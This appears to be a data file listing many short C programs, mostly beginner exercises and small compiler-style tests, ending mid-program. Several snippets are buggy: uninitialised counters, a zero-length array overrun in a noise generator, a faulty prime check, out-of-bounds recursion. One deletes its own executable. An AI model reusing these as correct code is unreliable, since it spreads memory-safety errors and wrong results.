    "#include <stdio.h>\n#include <stdlib.h>\n#include<math.h>\n\nint main()\n{\n int i, j, k, n;\n        printf(\"Enter the size of the matrix: \");\n        scanf(\"%d\", &n);\n        double C[10][10], A[10][10], B[10], S1, S2;\n        double T[10][10], s;\n double *X;\n        X = malloc(sizeof(double) * n);\n        double *Y;\n        Y = malloc(sizeof(double) * n);\n        for(i=0;i<n;i++)\n        {\n                for(j=0;j<n;j++)\n                {\n                        printf(\"A[%d][%d]= \", i, j);\n                        scanf(\"%lf\", &A[i][j]);\n                }\n        }\n        for(i=0;i<n;i++)\n        {\n                printf(\"B[%d]= \", i);\n                scanf(\"%lf\", &B[i]);\n        }\n        C[0][0]=sqrt(A[0][0]);\n        for(i=1;i<n;i++)\n                C[i][0]=A[i][0]/C[0][0];\n        for(j=1;j<n;j++)\n        {\n                for(i=0;i<j - 1;i++)\n                        C[i][j]=0;\n                S1 = 0.0;\n                for(k=0;k<j;k++)\n                        S1+=pow(C[j][k], 2);\n                C[j][j]=sqrt(A[j][j]-S1);\n                for(i=j + 1;i<n;i++)\n                {\n                        S2 = 0.0;\n                        for(k=0;k<j;k++)\n                                S2+=C[i][k]*C[j][k];\n                        C[i][j]=(1.0/C[j][j])*(A[i][j]-S2);\n                }\n        }\n        printf(\"\\n\");\n printf(\"C= \");\n        for(i=0;i<n;i++)\n        {\n                for(j=0;j<n;j++)\n                        printf(\"%lf\\t\", C[i][j]);\n                 printf(\"\\n\");\n        }\n printf(\"T= \\n\");\n for(i=0;i<n;i++)\n {\n  for(j=0;j<n;j++)\n  {\n   T[i][j] = C[j][i];\n   printf(\"%lf\\t\", T[i][j]);\n  }\n  printf(\"\\n\");\n }\n   Y[0] = B[0]/C[0][0];\n        for(i = 1; i < n; i++)\n        {\n                s=0;\n                for(j = 0; j < i; j++)\n                        s += C[i][j]* Y[j];\n                Y[i] = (B[i]-s) / C[i][i];\n        }\n        printf(\"\\nY= \");\n        for (i = 0; i < n; i++)\n                 printf(\"%lf\\n\", Y[i]);\n        X[n-1] = Y[n-1] / T[n-1][n-1];\n        for(i = n-2; i >= 0; i--)\n        {\n                s = 0;\n                for(j = i+1; j < n; j++)\n                        s = s + T[i][j] * X[j];\n                X[i] = (Y[i] - s) / T[i][i];\n        }\n        printf(\"\\nX=  \");\n        for (i = 0; i < n; i++)\n                 printf(\"%lf\\n\", X[i]);\n return (0);\n}",
    "static void\n *p = (void*) &((char*)50)[2],\n *q = (void*) &((char*)50)[-2];\nint main(void) {\n unsigned long v = (unsigned long) p + (unsigned long) q;\n return v;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\nint fB(float *temp, float *p2){\n    p2 = temp;\n    *p2 = 29.0;\n    printf(\"(b2) %.1f \\n\", *temp);\n    return 0;\n}\nint main(int argc, char **argv) {\n    float temp = 26.5;\n    float *p2 = ((void*)0);\n    printf(\"(b1) %.1f \\n\",temp);\n    fB(&temp, p2);\n    printf(\"(b3) %.1f \\n\",temp);\n    return 0;\n}",
    "#include <stdio.h>\n\n\nint main() {\n    int arr[100000], i, n, min_value, ans;\n    scanf(\"%d\", &n);\n    for (i = 0; i < n; i++)\n        scanf(\"%d\", &arr[i]);\n    min_value = arr[n - 1];\n    ans = arr[n - 2] - arr[n - 1];\n    for (i = n - 2; i > -1; i--) {\n        ans = (ans) > (arr[i] - min_value) ? (ans) : (arr[i] - min_value);\n        min_value = (min_value) < (arr[i]) ? (min_value) : (arr[i]);\n    }\n    printf(\"%d\\n\", ans);\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint main(int argc, char *argv[]) {\n  int m , n;\n  int p;\n  long long a,b;\n  long long k;\n  a=1;b=1;\n  scanf(\"%d %d\",&m,&n);\n  for(p=1;p<=n;p++)\n  a=a*p;\n  for(p=m;p>m-n;p--)\n  b=b*p;\n  k=b/a;\n  printf(\"%lld\",k);\n return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <stdbool.h>\n#include <string.h>\n#include <math.h>\nint cmp(const void* a,const void* b){return *((int*)a)-*((int*)b);}\n\nint data[100000];\nint main() {\n  int maxx, minn;\n  int n;scanf(\"%d\",&n); int p;scanf(\"%d\",&p); for(int i=0;i<n;i++) {\n    int x;scanf(\"%d\",&x); data[i] = x;\n    if (!i) maxx = minn = x;\n    else if (x > maxx) maxx = x;\n    else if (x < minn) minn = x;\n  }\n  printf(\"%d\", (maxx<=minn*p) ? n : 0);\n}",
    "#include <stdio.h>\nint main(void){\n    unsigned int number_of_char;\n    while(getchar() != (-1)){\n number_of_char++;\n    }\n    printf(\"\u6587\u4ef6\u603b\u5b57\u7b26\u6570: %u\\n\", number_of_char);\n    return 0;\n}",
    "#include <stdio.h>\nint main(void) {\n    float preco, reajuste, TB, TL;\n    int quantidade;\n    printf(\"Pre\u00e7o: R$ \");\n    scanf(\"%f\", &preco);\n    printf(\"Quantidade (Unid.): \");\n    scanf(\"%i\", &quantidade);\n    TB = preco * quantidade;\n    printf(\"Total a pagar (sem desconto): R$ %.2f\\n\", TB);\n    if (TB > 1000.00)\n    {\n        printf(\"Reajuste (%%):\");\n        scanf(\"%f\", &reajuste);\n        TL = TB * (1 - reajuste / 100);\n        printf(\"Total a pagar (com desconto): R$ %.2f\\n\", TL);\n    }\n    return 0;\n}",
    "#include <stdio.h>\nint main() {\n int n, cont = 0;\n float soma = 0;\n do {\n  scanf(\"%d\", &n);\n  if (n < 0){\n   break;\n  }\n  soma += n;\n  cont++;\n } while (n > 0);\n printf(\"%.2f\\n\", soma / cont);\n return 0;\n}",
    "#include<stdio.h>\nint isPrime(int n){\n    int prime = 0;\n    if(n%1==0 && n%n==0) {\n        if(n==2 ||n==3 ||n==5){\n            prime=1;\n            return prime;\n        }else{\n            if( n % 2 == 0 || n % 3 == 0 || n % 5 == 0 ){\n                prime=0;\n                return prime;\n            }else{\n                prime = 1;\n                return prime;\n            }\n         }\n    }\n}\nint main(void){\n    int num;\n    scanf(\"%d\",&num);\n    isPrime(num) == 1 ?printf(\"\\n primo \\n\") :isPrime(num)==0 ?printf(\"\\nnao primo\\n\"):0;\n    return 0;\n}",
    "#include <stdio.h>\nint main(){\n    int valor[10];\n int p,m,i;\n    scanf(\"%d\",&valor[0]);\n    m=valor[0];\n for (i=1;i<10;i++){\n        m=m*2;\n        valor[i]=m;\n }\n for (p=0;p<10;p++){\n        printf(\"N[%d] = %d\\n\",p,valor[p]);\n }\n}",
    "#include<stdio.h>\n#include <unistd.h>\n#include<sys/stat.h>\n#include<fcntl.h>\n#include<stdlib.h>\nint main(int argc, char *argv[])\n{\n    char c;\n    int inp, outp;\n    if(argc != 3)\n    {\n        printf(\"Arguments less than 3\");\n        exit(1);\n    }\n    inp = open(argv[1], ((0x04000000) | (0x10000000)));\n    outp = open(argv[2], (0x10000000)|(((__wasi_oflags_t)(1 << 0)) << 12), (0x100)|(0x80));\n    if(inp == -1 || outp == -1)\n    {\n        printf(\"File cannot be opened\\n\");\n        exit(1);\n    }\n    while(read(inp, &c, 1) == 1)\n        write(outp, &c, 1);\n    printf(\"Copied\\n\");\n    exit(0);\n}",
    "#include<string.h>\n#include<stdio.h>\n#include<stdlib.h>\n\nint main()\n{\n  char str1[128],str2[128];\n  char *p1,*p2;\n  p1 = str1;\n  p2 = str2;\n  int result;\n  printf(\"\u8bf7\u8f93\u5165\u5b57\u7b26\u4e321:\\n\");\n  fgets(p1,128,(stdin));\n  printf(\"\u8bf7\u8f93\u5165\u5b57\u7b26\u4e322:\\n\");\n  fgets(p2,128,(stdin));\n  result = strncasecmp(p1,p2,5);\n  if(result == 0)\n  {\n    printf(\"str1 == str2\");\n  }else if(result > 0)\n  {\n    printf(\"str1 > str2\");\n  }else\n  {\n    printf(\"str1 < str2\");\n  }\n  return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nvoid sort(int *numbers, int size)\n{\n    int pos = 0;\n    while (pos < size)\n    {\n        if (numbers[pos] >= numbers[pos - 1])\n            pos++;\n        else\n        {\n            int tmp = numbers[pos - 1];\n            numbers[pos - 1] = numbers[pos];\n            numbers[pos] = tmp;\n            pos--;\n            if (pos == 0)\n                pos = 1;\n        }\n    }\n}\nvoid display(int *array, int n)\n{\n    int i;\n    for (i = 0; i < n; ++i) printf(\"%d \", array[i]);\n    printf(\"\\n\");\n}\nint main()\n{\n    int size = 6;\n    int i;\n    int *numbers = malloc(size * sizeof(int));\n    printf(\"Insert %d unsorted numbers: \\n\", size);\n    for (i = 0; i < size; ++i) scanf(\"%d\", &numbers[i]);\n    printf(\"Initial array: \");\n    display(numbers, size);\n    sort(numbers, size);\n    printf(\"Sorted array: \");\n    display(numbers, size);\n    free(numbers);\n    return 0;\n}",
    "#include <stdio.h>\nint maximum (int num_1,int num_2);\nint minimum (int num_1, int num_2);\nint multiply (int num_1, int num_2);\nint main() {\n   int no1, no2;\n   printf(\"Enter a value for no 1 : \");\n   scanf(\"%d\", &no1);\n   printf(\"Enter a value for no 2 : \");\n   scanf(\"%d\", &no2);\n   printf(\"%d \", minimum(no1, no2));\n   printf(\"%d \", maximum(no1, no2));\n   printf(\"%d \", multiply(no1, no2));\n   return 0;\n}\nint maximum (int num_1,int num_2)\n{\n  int num_3;\n  if (num_1>num_2)\n  {\n    num_3=num_1;\n  }\n  else\n  {\n    num_3=num_2;\n  }\n  return num_3;\n}\nint minimum (int num_1, int num_2)\n{\n  int num_3;\n  if (num_1<num_2)\n  {\n    num_3=num_1;\n  }\n  else\n  {\n    num_3=num_2;\n  }\n  return num_3;\n}\nint multiply (int num_1, int num_2)\n{\n  int num_3;\n  num_3=num_1*num_2;\n  return num_3;\n}",
    "#include <stdio.h>\nint main (void) {\n    printf(\"int length %lu \\n\", sizeof(int));\n    printf(\"char length %lu \\n\", sizeof(char));\n    printf(\"short length %lu \\n\", sizeof(short));\n    printf(\"long length %lu \\n\", sizeof(long));\n    printf(\"double length %lu \\n\", sizeof(double));\n    printf(\"float length %lu \\n\", sizeof(float));\n}",
    "#include <stdio.h>\nint main(void){\n    char temp;\n    unsigned int count_replace;\n    while((temp = getchar()) != '#'){\n if(temp == '.'){\n     putchar('!');\n     count_replace++;\n        }else if( temp == '!'){\n     printf(\"!!\");\n     count_replace++;\n }else{\n     putchar(temp);\n }\n    }\n    printf(\"\u66ff\u6362\u4e86 %u \u6b21\\n\",count_replace);\n    return 0;\n}",
    "#include <stdlib.h>\n#include <stdio.h>\nconst char *strings[]={\n \"0\", \"1\", \"10\",\n \"100\", \"1000\", \"10000\", \"100000\", \"1000000\",\n \"10000000\", \"100000000\", \"1000000000\",\n \"-0\", \"-1\", \"-10\",\n \"-100\", \"-1000\", \"-10000\", \"-100000\", \"-1000000\",\n \"-10000000\", \"-100000000\", \"-1000000000\",\n \"a\", \"b\", \"f\", \"g\", \"z\",\n \"0x0\", \"0x1\", \"0xa\", \"0xf\", \"0x10\",\n \"00\", \"01\", \"07\", \"08\", \"0a\", \"010\",\n \"0x8000000\",\n \"2147483645\",\n \"2147483646\",\n \"2147483647\",\n \"2147483648\",\n \"2147483649\",\n \"-2147483645\",\n \"-2147483646\",\n \"-2147483647\",\n \"-2147483648\",\n \"-2147483649\",\n \"4294967293\",\n \"4294967294\",\n \"4294967295\",\n \"4294967296\",\n \"4294967297\",\n \"-4294967293\",\n \"-4294967294\",\n \"-4294967295\",\n \"-4294967296\",\n \"-4294967297\",\n \"\",\n \"00\",\n \"0x\",\n \"0x0\",\n \"-\",\n \"+\",\n \" \",\n \" -\",\n \" - 0\",\n};\nint n_tests=sizeof(strings)/sizeof(strings[0]);\nvoid do_test(int base);\nvoid do_utest(int base);\nint main(int argc,char *argv[])\n{\n do_test(0);\n do_test(8);\n do_test(10);\n do_test(16);\n do_test(36);\n do_utest(0);\n do_utest(8);\n do_utest(10);\n do_utest(16);\n do_utest(36);\n return 0;\n}\nvoid do_test(int base)\n{\n int i;\n long n;\n char *endptr;\n for(i=0;i<n_tests;i++){\n  n=strtol(strings[i],&endptr,base);\n  printf(\"strtol(\\\"%s\\\",%d) len=%lu res=%ld\\n\",\n   strings[i],base,(unsigned long)(endptr-strings[i]),n);\n }\n}\nvoid do_utest(int base)\n{\n int i;\n unsigned long n;\n char *endptr;\n for(i=0;i<n_tests;i++){\n  n=strtoul(strings[i],&endptr,base);\n  printf(\"strtoul(\\\"%s\\\",%d) len=%lu res=%lu\\n\",\n   strings[i],base,(unsigned long)(endptr-strings[i]),n);\n }\n}",
    "#include<stdio.h>\nint main(){\n    int a,b,c;\n    printf(\"Enter two numbers\");\n    scanf(\"%d%d\",&a,&b);\n    c=a-b;\n    printf(\"Subtraction of two numbers is %d\",c);\n    return 0;\n}",
    "#include <stdio.h>\nint check_prime(int n);\nint main()\n{\n    int n, i;\n    scanf(\"%d\",&n);\n    for(i=2; i<=n/2; ++i)\n    {\n        if (check_prime(i)!=0)\n        {\n            if ( check_prime(n-i)!=0)\n            {\n                printf(\"Yes\\n\");\n                return 0;\n            }\n        }\n    }\n    printf(\"No\\n\");\n    return 0;\n}\nint check_prime(int n)\n{\n    if(n==1)\n        return 1;\n    int i, flag=1;\n    for(i=2; i<=n/2; ++i)\n       if(n%i==0)\n          flag=0;\n    return flag;\n}",
    "#include<stdio.h>\n#include<math.h>\nint main()\n{\n int n,temp,k=0,sum=0;\n printf(\"Enter an Integer: \");\n scanf(\"%d\",&n);\n temp=n;\n while(temp!=0)\n {\n  temp/=10;\n  k++;\n }\n temp=n;\n while(temp!=0)\n {\n  sum+=pow(temp%10,k);\n  temp/=10;\n }\n if(sum==n)\n     printf(\"%d is an Armstorng no.\\n\",n);\n else\n     printf(\"%d is not an Armstrong no.\\n\",n);\n return 0;\n}",
    "#include <stdio.h>\nint main() {\n   float Subject_1, Subject_2, total, average;\n    printf(\"Subject01 Mark: \");\n    scanf(\"%f\",&Subject_1);\n    printf(\"Subject02 Mark: \");\n    scanf(\"%f\",&Subject_2);\n    total = Subject_1 + Subject_2;\n    average = total/2.0;\n    printf(\"\\nThe total marks is :\\%.2f\",total);\n    printf(\"\\nThe average marks is :\\%.2f\",average);\n  return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nunsigned factorial(unsigned num);\nint main(int argc, char * argv[]){\n    int ans, sum;\n    ans = factorial(atoi(argv[1]));\n    printf(\"The factorial of %d is %d.\\n\", atoi(argv[1]), ans);\n}\nunsigned factorial(unsigned num){\n if (num == 1){\n        return 1;\n    }\n    return num * factorial(num - 1);\n}",
    "#include <stdio.h>\n#include <math.h>\nint isAscending(int array[], int array_size, int index);\nint binary_search(int array[], int array_size, int num_to_search, int index);\n\nint main(void){\n    int array_elements,\n        i,\n        search_num;\n    int array[20];\n    printf(\"Input the number of elements to store in the array: \");\n    scanf(\"%d\", &array_elements);\n    printf(\"Input %d elemnts to the array:\\n\", array_elements);\n    for(i = 0; i < array_elements; ++i){\n        printf(\"element - %d: \", i);\n        scanf(\"%d\", &array[i]);\n    }\n    if(isAscending(array, array_elements, 0)){\n        printf(\"Input the number to search: \");\n        scanf(\"%d\", &search_num);\n        printf(\"\\nFound number %d in index %d\\n\\n\", search_num, binary_search(array, array_elements, search_num, 0));\n    }\n    else{\n        printf(\"Array not in order! Please enter array in order.\\n\");\n    }\n    return 0;\n}\nint isAscending(int array[], int array_size, int index){\n    int return_value;\n    if((array[index] < array[index + 1]) || (array[index] == array[index + 1])){\n        return_value = 1;\n        if(index < (array_size - 2)){\n            return_value = isAscending(array, array_size, index + 1);\n        }\n    }\n    else{\n        return_value = 0;\n    }\n    return return_value;\n}\nint binary_search(int array[], int array_size, int num_to_search, int index){\n    int i,\n        return_value;\n    if(array_size >= 1){\n        if(num_to_search == array[array_size / 2]){\n            return_value = array_size/2;\n        }\n        if(num_to_search < array[array_size / 2]){\n            return_value = binary_search(array, array_size-1, num_to_search, index);\n        }\n        if(num_to_search > array[(int)floor((array_size/2.0))]){\n            return_value = binary_search(array, array_size+1, num_to_search, index);\n        }\n    }\n    return return_value;\n}\nint ascending_order(int array[], int array_size){\n    return 0;\n}",
    "#include <stdio.h>\nint main()\n{\n    int i=5;\n     int arr[5],sum=0;\n    for( i = 0; i < 5; i++)\n  {\n       printf(\"enter a value for arr[%d]=\",i);\n       scanf(\"%d\",&arr[i]);\n       sum+=arr[i];\n    }\n    printf(\"sum=%d\\n\",sum);\n}",
    "#include<stdio.h>\nlong int add(long int bin1,long int bin2)\n{\n    long int sum[50],res=0,k=0,r=0;\n    for(long int i=bin1,j=bin2;i!=0 || j!=0;i/=10,j/=10)\n    {\n        long int p=i%10;\n        long int q=j%10;\n        sum[k++]=(p+q+r)%2;\n        r=(p+q+r)/2;\n    }\n    if(r==1)\n        sum[k++]=r;\n    k--;\n    for( ;k>=0;k--)\n        res=res*10+sum[k];\n    return res;\n}\nint main()\n{\n    long int b1,b2,mul=0;\n    printf(\"Enter 2 binary numbers\\n\");\n    scanf(\"%ld %ld\",&b1,&b2);\n    printf(\"%ld x %ld = \",b1,b2);\n    for(long int f=1;b2!=0;f=10,b2/=10)\n    {\n        b1=b1*f;\n        if(b2%10==1)\n           mul=add(b1,mul);\n    }\n    printf(\"%ld\",mul);\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint main(void) {\n    int x = 6;\n    int y = 10;\n    printf(\"%d\\n\", x * x + 5 * y - 4);\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <limits.h>\nint main(int argc, char const *argv[])\n{\n    int n;\n    scanf(\"%d\",&n);\n if(n<2){\n  printf(\"Cannot find the second min of max\\n\");\n  return 0;\n }\n    int *a;\n    a=(int* )malloc(n*sizeof(int));\n    for(int i=0;i<n;i++)\n        scanf(\"%d\",a+i);\n    int min=2147483647, secMin=(-2147483647 -1);\n for(int i=0;i<n;i++)\n {\n  if(a[i] < min){\n   secMin=min;\n   min=a[i];\n  }\n  else if(a[i]>min && a[i]<secMin){\n   secMin=a[i];\n  }\n }\n int max=(-2147483647 -1), secMax=2147483647;\n for(int i=0;i<n;i++)\n {\n  if(a[i] > max){\n   secMax=max;\n   max=a[i];\n  }\n  else if(a[i]>secMax && a[i]<max){\n   secMax=a[i];\n  }\n }\n    printf(\"The second smallest= %d\\nThe second Largest= %d\\n\",secMin, secMax);\n    free(a);\n    remove(argv[0]);\n    return 0;\n}",
    "#include <stdio.h>\nint main()\n{\n    printf(\"Insert here the number of dogs: \\n\");\n    double dogs;\n    scanf(\"%lf\", &dogs);\n    printf(\"You have %f,%e,%g, dogs./n\", dogs,dogs,dogs);\n    return 0 ;\n}",
    "#include <stdio.h>\n#include <math.h>\n#include <stdlib.h>\nint main(int argc, char *argv[])\n{\n    double c5, c0, semitone_ratio;\n    double frequency;\n    int midinote;\n    semitone_ratio = pow(2.0, 1.0 / 12.0);\n    c5 = 220.0 * pow(semitone_ratio, 3);\n    c0 = c5 * pow(0.5, 5);\n    if (argc != 2)\n    {\n        printf(\"4-Listing1.4 : converts MIDI note to frequency. \\n\"\n);\n        printf(\"usage: 4-Listing MIDInote.\\n\"\n);\n        printf(\" range: 0 <= MIDInote <= 127 \\n\");\n        return 1;\n    }\n    midinote = atoi(argv[1]);\n    if (midinote < 0)\n    {\n        printf(\"Bad MIDI note value: %s\\n\", argv[1]);\n        return 1;\n    }\n    if (midinote > 127)\n    {\n        printf(\"%s is beyond the MIDI range!\\n\", argv[1]);\n        return 1;\n    }\n    frequency = c0 * pow(semitone_ratio, (double)midinote);\n    printf(\"Frequency pf MIDI note %d = %f\\n\", midinote, frequency);\n    return 0;\n}",
    "#include <stdio.h>\nint geraden(double u[3], double v[3], double s[2]) {\n    if (-u[0]/u[1] == -v[0]/v[1]) {\n        if (u[2]/u[1] == v[2]/v[1]) {\n            return 0;\n        }\n        return 1;\n    }\n    s[0] = (v[2]/v[1] - u[2]/u[1]) / (-u[0]/u[1] + v[0]/v[1]);\n    s[1] = (-u[0]/u[1])*s[0] + u[2]/u[1];\n    return -1;\n}\nint main() {\n    double u[3] = {1,2,3};\n    double v[3] = {4,8,13};\n    double s[2] = {9,9};\n    int output = 0;\n    printf(\"# First line (a)x+(b)y=(c)\\n\");\n    printf(\"a: \"); scanf(\"%lf\", &u[0]);\n    printf(\"b: \"); scanf(\"%lf\", &u[1]);\n    printf(\"c: \"); scanf(\"%lf\", &u[2]);\n    printf(\"# Second line (d)x+(e)y=(f)\\n\");\n    printf(\"d: \"); scanf(\"%lf\", &v[0]);\n    printf(\"e: \"); scanf(\"%lf\", &v[1]);\n    printf(\"f: \"); scanf(\"%lf\", &v[2]);\n    if (u[0] == 0 || u[1] == 0 || v[0] == 0 || v[1] == 0) {\n        printf(\"Coefficients can't be zero.\\n\");\n        return 0;\n    }\n    output = geraden(u, v, s);\n    if (output == 0) {\n        printf(\"=> IDENTICAL\\n\");\n    }\n    else if (output == 1) {\n        printf(\"=> PARALLEL\\n\");\n    }\n    else {\n        printf(\"=> INTERSECTION at (%.2lf, %.2lf)\\n\", s[0], s[1]);\n    }\n}",
    "#include <stdio.h>\nint ordem, bubble; float notas[5], soma, aux;\nfloat orga()\n{\n  for (ordem = 0; ordem < 5; ordem ++)\n  {\n    for (bubble = 0; bubble < 5; bubble ++)\n    {\n      if (notas[ordem] < notas[bubble])\n      {\n        aux = notas[bubble];\n        notas[bubble] = notas[ordem];\n        notas[ordem] = aux;\n      }\n    }\n  }\n}\nint main()\n{\n  scanf(\"%f %f %f %f %f\", &notas[0], &notas[1], &notas[2], &notas[3], &notas[4]);\n  orga();\n  soma = notas[1] + notas[2] + notas[3];\n  printf(\"%.1f\\n\", soma);\n}",
    "extern void abort (void);\nunsigned char value[4] = { 66, 9, 160, 255 };\nint main (void)\n{\n  volatile float f;\n  unsigned char a[4];\n  __builtin_memcpy ((void *)&f, value, 4);\n  __builtin_memcpy (a, (void *)&f, 4);\n  if (a[2] != 160)\n    abort ();\n  return 0;\n}",
    "#include <stdio.h>\n#include <stdbool.h>\n#include <ctype.h>\nstatic void expand (const char *);\nstatic _Bool expand_range (const char *);\nint main (int argc, char ** argv) {\n for (int i = 1; i < argc; i++)\n  expand (argv[i]);\n return 0;\n}\nstatic void expand (const char * str) {\n const char * processed_up_to = ((void*)0);\n while (*str != '\\0') {\n  _Bool status = expand_range (str);\n  if (status) {\n   str += 2;\n   processed_up_to = str;\n  } else {\n   if (!processed_up_to || str > processed_up_to)\n    putchar (*str);\n   str++;\n  }\n }\n putchar ('\\n');\n}\nstatic _Bool expand_range (const char * str) {\n if ((0 ? islower(str[0]) : ((unsigned)(str[0])-'a') < 26) && str[1] == '-' && (0 ? islower(str[2]) : ((unsigned)(str[2])-'a') < 26))\n  ;\n else if ((0 ? isupper(str[0]) : ((unsigned)(str[0])-'A') < 26) && str[1] == '-' && (0 ? isupper(str[2]) : ((unsigned)(str[2])-'A') < 26))\n  ;\n else if ((0 ? isdigit(str[0]) : ((unsigned)(str[0])-'0') < 10) && str[1] == '-' && (0 ? isdigit(str[2]) : ((unsigned)(str[2])-'0') < 10))\n  ;\n else\n  return 0;\n if (str[0] > str[2])\n  return 0;\n for (char c = str[0]; c <= str[2]; c++)\n  putchar (c);\n return 1;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint main(int argc, char *argv[])\n{\n printf(\"%d\\n\", 5+2);\n printf(\"%d\\n\", 9-4);\n printf(\"%d\\n\", 2*3);\n printf(\"%d\\n\", 10/5);\n printf(\"%d\\n\", 9%4);\n system(\"PAUSE\");\n return 0;\n}",
    "#include <stdio.h>\n#include <string.h>\n#include <math.h>\n#include <stdlib.h>\nvoid printMatrix(char ** matrix, int n) {\n    int i,j;\n    printf(\"\\n\\n\");\n    for(i = 0; i < n; i++) {\n        for(j = 0; j < n; j++) {\n            printf(\"%c\", matrix[i][j]);\n        }\n        printf(\"\\n\");\n    }\n    return ;\n}\nvoid bubbleSort(char arr[], int n)\n{\n   int i, j;\n   for (i = 0; i < n-1; i++)\n       for (j = 0; j < n-i-1; j++)\n           if (arr[j] > arr[j+1])\n              {\n                  char temp;\n                  temp = arr[j+1];\n                  arr[j+1] = arr[j];\n                  arr[j] = temp;\n              }\n}\nvoid challenge(char** matrix, int n) {\n    for(int i =0; i < n; i++){\n        bubbleSort(matrix[i], n);\n        if( i > 0) {\n            for(int j =0; j < n; j++) {\n                if (matrix[i-1][j] > matrix[i][j]) {\n                    printf(\"NO\\n\");\n                    return;\n                }\n            }\n        }\n    }\n    for(int j = 0; j < n; j++){\n        for(int i =0; i < n-1; i++) {\n            if (matrix[i][j] > matrix[i+1][j]) {\n                printf(\"NO\\n\");\n                return;\n            }\n        }\n    }\n    printf(\"YES\\n\");\n    return;\n}\nint main() {\n    int t;\n    scanf(\"%d\", &t);\n    while(t--){\n        int n;\n        scanf(\"%d\", &n);\n        char ** matrix;\n        matrix = (char **)malloc(n * sizeof(char *));\n        int i;\n        for(i = 0; i < n; i++) {\n            matrix[i] = (char *) malloc(n * sizeof(char));\n            scanf(\"%s\", matrix[i]);\n        }\n        challenge(matrix, n);\n    }\n    return 0;\n}",
    "#include <stdio.h>\n#include <pthread.h>\n#include <semaphore.h>\n#include <unistd.h>\nvoid stageA() {\n    printf(\"Starting A\\n\");\n    sleep(1);\n    printf(\"Finishing A \\n\");\n}\nvoid stageB() {\n    printf(\"Starting B\\n\");\n    sleep(1);\n    printf(\"Finishing B \\n\");\n}\nvoid stageC() {\n    printf(\"Starting C\\n\");\n    sleep(1);\n    printf(\"Finishing C \\n\");\n}\nvoid runWholeProcess() {\n    stageA();\n    stageB();\n    stageC();\n}\nint main(int argc, char **argv) {\n    runWholeProcess();\n    runWholeProcess();\n    runWholeProcess();\n    printf(\"Everything finished.\\n\");\n}",
    "int my_atoi(char *p) {\n    int k = 0;\n    while (*p) {\n        k = (k << 3) + (k << 1) + (*p) - '0';\n        p++;\n     }\n     return k;\n}\nint main(int argc, char **argv) {\n return my_atoi(argv[1]);\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nvoid readArray(int a[][3], int row, int col);\nint maxArray(int a[][3],int row, int col);\nint main(int argc, char *argv[]) {\n const int row=4;\n const int col=3;\n int max;\n int a[row][col];\n readArray(a, row, col);\n max=maxArray(a, row,col);\n printf(\"The max element is %d \\n\",max);\n system(\"PAUSE\");\n return 0;\n}\nvoid readArray(int a[][3], int row, int col)\n{\n int r, c;\n printf(\"Enter the elements of array (size 4x3): \\n\");\n for(r=0; r<row;r++)\n  for(c=0;c<col;c++)\n   scanf(\"%d\", &a[r][c]);\n}\nint maxArray(int a[][3],int row, int col)\n{\n int r, c, max=a[0][0];\n for(r=0; r<row;r++)\n  for(c=0;c<col;c++)\n   if (max<a[r][c])\n    max=a[r][c];\n return(max);\n}",
    "#include<stdio.h>\nint main(int argc, char* argv[]){\n   if (argc < 2) return 1;\n   char* str = argv[1];\n   int i=0;\n   printf(\"%c\",str[0]);\n   while(str[i]!='\\0'){\n       if(str[i]==' '){\n            i++;\n            printf(\"%c\",str[i]);\n       }\n       i++;\n   }\n   printf(\"\\n\");\n   return 0;\n}",
    "#include <stdio.h>\n#include <string.h>\nconst long long nums[] = {1, 10, 100, 1000, 10000, 100000, 1000000, 10000000, 100000000, 1000000000};\nlong long bs(long long maxnum, long long minnum, long long lim, long long a){\n long long meio = (maxnum + minnum)/2;\n if((maxnum - minnum) == 1){\n  if((maxnum * a) > lim) return minnum;\n  else return maxnum;\n }\n if(maxnum == minnum) return maxnum;\n else if((meio * a) == lim) return meio;\n else{\n  if((meio * a) < lim) return bs(maxnum, meio, lim, a);\n  else return bs(meio, minnum, lim, a);\n }\n}\nint main(){\n long long a, b, x, res = 0;\n scanf(\"%lld%lld%lld\", &a, &b, &x);\n int maxi = 0;\n for(int i = 1; i < 10; ++i){\n  if((a * nums[i] + b * (i+1)) > x) break;\n  maxi = i;\n }\n if(!((a + b) > x)){\n  long long maxnum = nums[maxi]*10 -1, minnum = nums[maxi];\n  maxnum = maxnum > nums[9] ? nums[9]: maxnum;\n  res = bs(maxnum, minnum, (x-b*(maxi+1)), a);\n }\n printf(\"%lld\\n\", res);\n}",
    "int main()\n{\n  for(int i=0; i<2; ++i)\n    for(int j=0; j<10; ++j);\n  return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nstatic int SEED = 65536;\nstatic int SIZE = 16;\nstatic int hash[] = {};\ndouble get_random() {\n    return ((double)rand() / (double)(0x7fffffff));\n}\nvoid gen_hash() {\n    srand(SEED * SEED);\n    for (int i = 0; i < 256; ++i) {\n        hash[i] = get_random() * 255;\n    }\n}\nint noise2(int x, int y)\n{\n    int tmp = hash[(y + SEED) % 256];\n    return hash[(tmp + x) % 256];\n}\nfloat lin_inter(float x, float y, float s)\n{\n    return x + s * (y-x);\n}\nfloat smooth_inter(float x, float y, float s)\n{\n    return lin_inter(x, y, s * s * (3-2*s));\n}\nfloat noise2d(float x, float y)\n{\n    int x_int = x;\n    int y_int = y;\n    float x_frac = x - x_int;\n    float y_frac = y - y_int;\n    int s = noise2(x_int, y_int);\n    int t = noise2(x_int+1, y_int);\n    int u = noise2(x_int, y_int+1);\n    int v = noise2(x_int+1, y_int+1);\n    float low = smooth_inter(s, t, x_frac);\n    float high = smooth_inter(u, v, x_frac);\n    return smooth_inter(low, high, y_frac);\n}\nfloat perlin2d(float x, float y, float freq, int depth)\n{\n    float xa = x*freq;\n    float ya = y*freq;\n    float amp = 1.0;\n    float fin = 0;\n    float div = 0.0;\n    int i;\n    for(i=0; i<depth; i++)\n    {\n        div += 256 * amp;\n        fin += noise2d(xa, ya) * amp;\n        amp /= 2;\n        xa *= 2;\n        ya *= 2;\n    }\n    return fin/div;\n}\nint main(int argc, char *argv[])\n{\n    int x, y;\n    gen_hash();\n    for(y=0; y<SIZE; y++) {\n        